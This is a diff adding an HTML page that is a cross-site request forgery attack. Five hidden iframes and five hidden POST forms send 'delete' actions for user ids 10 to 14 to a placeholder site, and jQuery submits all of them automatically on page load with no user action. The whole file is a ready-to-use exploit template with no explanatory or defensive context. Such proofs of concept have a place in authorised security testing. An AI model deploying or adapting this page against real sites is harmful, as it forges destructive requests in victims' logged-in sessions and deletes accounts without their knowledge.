@@ -1,0 +1,52 @@
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+
+<iframe style="display:none" name="csrf-frame0"></iframe>
+<iframe style="display:none" name="csrf-frame1"></iframe>
+<iframe style="display:none" name="csrf-frame2"></iframe>
+<iframe style="display:none" name="csrf-frame3"></iframe>
+<iframe style="display:none" name="csrf-frame4"></iframe>
+
+
+<form method="POST" id="form0" target="csrf-frame0" action="https://www.example.com/action">
+          <input type="hidden" name="action" value="delete" />
+          <input type="hidden" name="foo" value="bar" />
+          <input type="hidden" name="userid" value="10" />
+</form>
+<form method="POST" id="form1" target="csrf-frame1" action="https://www.example.com/action">
+          <input type="hidden" name="action" value="delete" />
+          <input type="hidden" name="foo" value="bar" />
+          <input type="hidden" name="userid" value="11" />
+</form>
+<form method="POST" id="form2" target="csrf-frame2" action="https://www.example.com/action">
+          <input type="hidden" name="action" value="delete" />
+          <input type="hidden" name="foo" value="bar" />
+          <input type="hidden" name="userid" value="12" />
+</form>
+<form method="POST" id="form3" target="csrf-frame3" action="https://www.example.com/action">
+          <input type="hidden" name="action" value="delete" />
+          <input type="hidden" name="foo" value="bar" />
+          <input type="hidden" name="userid" value="13" />
+</form>
+<form method="POST" id="form4" target="csrf-frame4" action="https://www.example.com/action">
+          <input type="hidden" name="action" value="delete" />
+          <input type="hidden" name="foo" value="bar" />
+          <input type="hidden" name="userid" value="14" />
+</form>
+<script>
+$(document).ready(function(){
+     $("#form0").submit();
+});
+$(document).ready(function(){
+     $("#form1").submit();
+});
+$(document).ready(function(){
+     $("#form2").submit();
+});
+$(document).ready(function(){
+     $("#form3").submit();
+});
+$(document).ready(function(){
+     $("#form4").submit();
+});
+</script>
